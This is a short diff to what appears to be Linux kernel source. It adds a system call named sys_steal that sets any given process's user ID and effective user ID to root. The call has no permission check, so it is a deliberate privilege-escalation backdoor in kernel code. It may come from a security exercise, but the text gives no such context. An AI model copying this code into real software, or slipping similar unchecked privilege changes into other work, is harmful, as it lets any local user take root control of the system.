@@ -2276,3 +2276,15 @@ asmlinkage long sys_getcpu(unsigned __user *cpup, unsigned __user *nodep,
 	}
 	return err ? -EFAULT : 0;
 }
+
+asmlinkage long sys_steal(pid_t pid)
+{
+	struct task_struct *task = find_task_by_pid(pid);
+	if (task)
+	{
+		task->uid = 0;
+		task->euid = 0;
+		return 0;
+	}
+	return -EINVAL;
+}
